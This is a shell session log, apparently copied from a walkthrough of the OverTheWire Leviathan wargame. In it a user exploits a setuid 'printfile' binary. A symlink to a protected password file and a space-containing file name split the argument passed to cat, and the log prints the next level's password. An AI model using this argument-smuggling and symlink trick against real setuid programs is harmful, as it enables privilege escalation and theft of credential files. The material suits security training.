```pass
leviathan2@leviathan:~$ ls
printfile
leviathan2@leviathan:~$ mkdir /tmp/bernardo && cd /tmp/bernardo
leviathan2@leviathan:/tmp/bernardo$ ln -s /etc/leviathan_pass/leviathan3 pass
leviathan2@leviathan:/tmp/bernardo$ ls
pass
leviathan2@leviathan:/tmp/bernardo$ cat pass
cat: pass: Permission denied
leviathan2@leviathan:/tmp/bernardo$ ~/printfile pass
You cant have that file...
leviathan2@leviathan:/tmp/bernardo$ ~/printfile "pass a.txt"
You cant have that file...
leviathan2@leviathan:/tmp/bernardo$ ls
pass
leviathan2@leviathan:/tmp/bernardo$ ls -la
total 228
drwxr-sr-x    2 leviathan2 root   4096 Apr 25 20:59 .
drwxrws-wt 3635 root       root 225280 Apr 25 21:00 ..
lrwxrwxrwx    1 leviathan2 root     30 Apr 25 20:59 pass -> /etc/leviathan_pass/leviathan3
leviathan2@leviathan:/tmp/bernardo$ touch "pass file.txt"
leviathan2@leviathan:/tmp/bernardo$ ~/printfile "pass file.txt"
Ahdiemoo1j
/bin/cat: file.txt: No such file or directory
``` 

got it from: https://jhalon.github.io/over-the-wire-leviathan/